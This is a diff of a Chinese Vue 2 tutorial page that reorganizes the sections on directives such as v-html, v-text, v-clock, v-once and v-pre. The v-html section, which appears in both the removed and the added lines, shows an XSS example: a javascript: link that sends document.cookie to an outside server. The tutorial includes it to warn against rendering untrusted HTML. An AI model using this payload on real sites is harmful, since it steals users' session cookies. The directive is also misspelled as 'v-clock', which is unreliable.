@@ -352,7 +352,7 @@
 </span></span><span class="line"><span class="cl">  <span class="p">});</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></span></code></pre></div><p>其中，提供了另外一种用于监听对象内部属性变化的<code>watch</code>简写形式：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="s1">&#39;numbers.y&#39;</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="s1">&#39;numbers.y&#39;</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
 </span></span><span class="line"><span class="cl"><span class="p">},</span>
 </span></span></code></pre></div><p>对<a href="/docs/vue/data-proxy-watch/#vue-%e8%ae%a1%e7%ae%97%e5%b1%9e%e6%80%a7">计算属性</a>中的案例进行修改，让名字的修改延迟1秒：</p>
@@ -742,54 +742,6 @@
 <hr>
 <h1 id="指令语法" data-numberify>指令语法<a class="anchor ms-1" href="#指令语法"></a></h1>
 <p>指令是指由Vue定义的、带有<code>v-</code>前缀的特殊HTML属性。指令可以用于解析标签（包括标签属性、标签内容、绑定事件等等）。</p>
-<h2 id="输出-html" data-numberify>输出 HTML<a class="anchor ms-1" href="#输出-html"></a></h2>
-<p>使用<code>v-html</code>，可以将HTML代码插入到标签中。<code>v-html</code>的用法如下：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">v-html</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>Hello World!<span class="c">&lt;!-- 原本的标签内容会被 v-html 所覆盖 --&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;&lt;h2&gt;Hello Vue.js!&lt;/h2&gt;&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">})</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p><code>v-html</code>存在安全性问题。在使用<code>v-html</code>插入Html代码时，有可能会被其它别有用心的人利用，在页面中插入一些不安全的代码。例如通过<code>v-html</code>获取他人浏览器的Cookie：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-html</span><span class="o">=</span><span class="s">&#34;link&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="c1">// baidu.com 可以替换成其它非法获取别人浏览器 cookie 的服务器
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">link</span><span class="o">:</span> <span class="s1">&#39;&lt;a href=javascript:location.href=&#34;http://baidu.com?&#34;+document.cookie&gt;跳转链接&lt;/a&gt;&#39;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">});</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>点击链接后，浏览器在当前服务器中存储的Cookie（没有被<code>HttpOnly</code>字段限制的Cookie）会被毫无保留地传递到<code>baidu.com</code>这个服务器中。</p>
-<blockquote>
-<p>注：</p>
-<ul>
-<li>在网站上动态渲染任意Html是非常危险的，容器导致XSS攻击。</li>
-<li>一定要在可信的内容上使用<code>v-html</code>，永远不要在用户提交的内容上使用。</li>
-</ul>
-</blockquote>
-<h2 id="输出文本" data-numberify>输出文本<a class="anchor ms-1" href="#输出文本"></a></h2>
-<p>使用<code>v-text</code>，可以将文本插入到标签中。其用法如下：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-text</span><span class="o">=</span><span class="s">&#34;msg&#34;</span><span class="p">&gt;</span><span class="c">&lt;!-- 原本的标签内容会被 v-text 所覆盖 --&gt;</span><span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">},</span>
-</span></span><span class="line"><span class="cl">  <span class="p">});</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p><code>v-text</code>与<code>v-html</code>不同的是，<code>v-text</code>不能插入Html内容。</p>
 <h2 id="数据绑定" data-numberify>数据绑定<a class="anchor ms-1" href="#数据绑定"></a></h2>
 <h3 id="单向数据绑定" data-numberify>单向数据绑定<a class="anchor ms-1" href="#单向数据绑定"></a></h3>
 <p><code>v-bind</code>单向数据绑定：单向绑定是指数据只能从Vue实例中的<code>data</code>流向页面内容。</p>
@@ -1656,38 +1608,7 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="p">});</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div><h2 id="v-clock" data-numberify>v-clock<a class="anchor ms-1" href="#v-clock"></a></h2>
-<p><code>v-clock</code>可以有效防止当网络存在问题时，浏览器直接将未解析的Vue模板展示给用户。例如：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="o">[</span><span class="nt">v-clock</span><span class="o">]</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">display</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-clock</span><span class="p">&gt;</span>{{msg}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="p">},</span>
-</span></span><span class="line"><span class="cl">  <span class="p">});</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p><code>v-clock</code>的原理是：通过CSS属性选择器，将带有<code>v-clock</code>属性的元素设置为<code>display: none</code>，所以一开始页面中设置了<code>v-clock</code>属性的元素并不会展示在页面中。而Vue实例在接管Vue模板的一瞬间，会将模板中所有元素的<code>v-clock</code>属性给移除。当网速过慢时，浏览器不会直接将Vue模板的所有内容展示给用户，而是在浏览器成功请求到Vue之后，Vue实例将<code>v-clock</code>属性给移除，页面才正常展示。</p>
-<p><code>v-clock</code>指令并没有值，其本质是一个特殊属性：</p>
-<ul>
-<li>Vue实例创建完毕并接管容器后，会删除模板中所有元素的<code>v-clock</code>属性。</li>
-<li><code>v-clock</code>配合CSS属性选择器使用可以解决网速过慢时页面直接展示出未经处理的Vue模板问题。</li>
-</ul>
-<h2 id="指令汇总" data-numberify>指令汇总<a class="anchor ms-1" href="#指令汇总"></a></h2>
+</span></span></code></pre></div><h2 id="指令汇总" data-numberify>指令汇总<a class="anchor ms-1" href="#指令汇总"></a></h2>
 <p>Vue中常用的指令有：</p>
 <table>
 <thead>
@@ -1731,6 +1652,114 @@
 </tr>
 </tbody>
 </table>
+<h2 id="其它内置指令" data-numberify>其它内置指令<a class="anchor ms-1" href="#其它内置指令"></a></h2>
+<h3 id="输出-html" data-numberify>输出 HTML<a class="anchor ms-1" href="#输出-html"></a></h3>
+<p>使用<code>v-html</code>，可以将HTML代码插入到标签中。<code>v-html</code>的用法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">v-html</span><span class="o">=</span><span class="s">&#34;title&#34;</span><span class="p">&gt;</span>Hello World!<span class="c">&lt;!-- 原本的标签内容会被 v-html 所覆盖 --&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;&lt;h2&gt;Hello Vue.js!&lt;/h2&gt;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><code>v-html</code>存在安全性问题。在使用<code>v-html</code>插入Html代码时，有可能会被其它别有用心的人利用，在页面中插入一些不安全的代码。例如通过<code>v-html</code>获取他人浏览器的Cookie：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">span</span> <span class="na">v-html</span><span class="o">=</span><span class="s">&#34;link&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// baidu.com 可以替换成其它非法获取别人浏览器 cookie 的服务器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">link</span><span class="o">:</span> <span class="s1">&#39;&lt;a href=javascript:location.href=&#34;http://baidu.com?&#34;+document.cookie&gt;跳转链接&lt;/a&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>点击链接后，浏览器在当前服务器中存储的Cookie（没有被<code>HttpOnly</code>字段限制的Cookie）会被毫无保留地传递到<code>baidu.com</code>这个服务器中。</p>
+<blockquote>
+<p>注：</p>
+<ul>
+<li>在网站上动态渲染任意Html是非常危险的，容器导致XSS攻击。</li>
+<li>一定要在可信的内容上使用<code>v-html</code>，永远不要在用户提交的内容上使用。</li>
+</ul>
+</blockquote>
+<h3 id="输出文本" data-numberify>输出文本<a class="anchor ms-1" href="#输出文本"></a></h3>
+<p>使用<code>v-text</code>，可以将文本插入到标签中。其用法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-text</span><span class="o">=</span><span class="s">&#34;msg&#34;</span><span class="p">&gt;</span><span class="c">&lt;!-- 原本的标签内容会被 v-text 所覆盖 --&gt;</span><span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><code>v-text</code>与<code>v-html</code>不同的是，<code>v-text</code>不能插入Html内容。</p>
+<h3 id="v-clock" data-numberify>v-clock<a class="anchor ms-1" href="#v-clock"></a></h3>
+<p><code>v-clock</code>可以有效防止当网络存在问题时，浏览器直接将未解析的Vue模板展示给用户。例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">[</span><span class="nt">v-clock</span><span class="o">]</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">display</span><span class="p">:</span> <span class="kc">none</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-clock</span><span class="p">&gt;</span>{{msg}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://cdn.jsdelivr.net/npm/vue@2.7.14/dist/vue.min.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">msg</span><span class="o">:</span> <span class="s1">&#39;Hello Vue.js!&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><code>v-clock</code>的原理是：通过CSS属性选择器，将带有<code>v-clock</code>属性的元素设置为<code>display: none</code>，所以一开始页面中设置了<code>v-clock</code>属性的元素并不会展示在页面中。而Vue实例在接管Vue模板的一瞬间，会将模板中所有元素的<code>v-clock</code>属性给移除。当网速过慢时，浏览器不会直接将Vue模板的所有内容展示给用户，而是在浏览器成功请求到Vue之后，Vue实例将<code>v-clock</code>属性给移除，页面才正常展示。</p>
+<p><code>v-clock</code>指令并没有值，其本质是一个特殊属性：</p>
+<ul>
+<li>Vue实例创建完毕并接管容器后，会删除模板中所有元素的<code>v-clock</code>属性。</li>
+<li><code>v-clock</code>配合CSS属性选择器使用可以解决网速过慢时页面直接展示出未经处理的Vue模板问题。</li>
+</ul>
+<h3 id="v-once" data-numberify>v-once<a class="anchor ms-1" href="#v-once"></a></h3>
+<p><code>v-once</code>用于让页面中的Vue数据始终显示为初始数据。<code>v-once</code>同样是没有值的特殊属性。</p>
+<ul>
+<li><code>v-once</code>所在节点在初次动态渲染后，就视为静态内容。</li>
+<li>后续数据的改变不会引起<code>v-once</code>所在结构的更新，可以用于优化性能。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-once</span><span class="p">&gt;</span>Original Number: {{num}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Current Number: {{num}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;num++&#34;</span><span class="p">&gt;</span>Number+1<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">num</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><h3 id="v-pre" data-numberify>v-pre<a class="anchor ms-1" href="#v-pre"></a></h3>
+<p><code>v-pre</code>指令：</p>
+<ul>
+<li><code>v-pre</code>可以跳过其所在节点的编译过程。</li>
+<li>可利用<code>v-pre</code>跳过没有使用指令语法、没有使用插值语法的节点，可以加快页面的编译。</li>
+<li><code>v-pre</code>没有值，直接在Html元素中指定即可。</li>
+</ul>
+<h2 id="自定义指令" data-numberify>自定义指令<a class="anchor ms-1" href="#自定义指令"></a></h2>
 <hr>
 <h1 id="过滤器" data-numberify>过滤器<a class="anchor ms-1" href="#过滤器"></a></h1>
 <p>Vue允许自定义过滤器，被用作一些常见的文本格式化。过滤器由“管道符”<code>|</code>指示，并且过滤器可以串联，其格式如下：</p>
